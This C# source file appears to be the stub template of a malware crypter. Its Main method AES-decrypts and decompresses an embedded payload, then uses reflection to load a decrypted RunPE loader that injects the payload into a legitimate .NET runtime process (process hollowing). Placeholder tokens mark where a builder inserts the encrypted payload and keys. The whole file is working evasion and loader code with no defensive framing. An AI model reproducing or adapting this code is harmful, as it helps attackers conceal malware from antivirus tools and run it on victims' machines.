using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Stub
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            string passwordAesCompressStub = "#PASSWORD_AES_COMPRESS_STUB#";
            string payloadAesCompressStub = "#PAYLOAD_AES_COMPRESS_STUB#";

            RunPe(Decompress(AES_Decrypt(Convert.FromBase64String(payloadAesCompressStub), passwordAesCompressStub)));
        }

        private static void RunPe(byte[] data)
        {
            string codeRunPe = "#CodeRunPE#";
            string passwordRunPe = "#PasswordRunPE#";
            string pathProcess = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "#PathProcess#");

            Assembly runpeLoader = Assembly.Load(Decompress(AES_Decrypt(Convert.FromBase64String(codeRunPe), passwordRunPe)));

            MethodInfo mi = runpeLoader.GetType("#NamespaceRunpe#.#ClassRunpe#").GetMethod("#MethodsRunPE#");
            object[] parameters = { pathProcess, data };
            mi.Invoke(null, parameters);
        }

        private static byte[] AES_Decrypt(byte[] payload, string key)
        {
            using (AesManaged aes256 = new AesManaged())
            using (MD5CryptoServiceProvider hashAes = new MD5CryptoServiceProvider())
            {
                aes256.Key = hashAes.ComputeHash(Encoding.ASCII.GetBytes(key));
                aes256.Mode = CipherMode.ECB;
                return aes256.CreateDecryptor().TransformFinalBlock(payload, 0, payload.Length);
            }
        }

        private static byte[] Decompress(byte[] decompressData)
        {
            using (MemoryStream decompressMemoryStream = new MemoryStream())
            {
                int decompressLength = BitConverter.ToInt32(decompressData, 0);
                decompressMemoryStream.Write(decompressData, 4, decompressData.Length - 4);
                byte[] decompressBuffer = new byte[decompressLength];
                decompressMemoryStream.Position = 0;
                using (GZipStream decompressZip = new GZipStream(decompressMemoryStream, CompressionMode.Decompress))
                {
                    decompressZip.Read(decompressBuffer, 0, decompressBuffer.Length);
                }
                return decompressBuffer;
            }
        }
    }
}
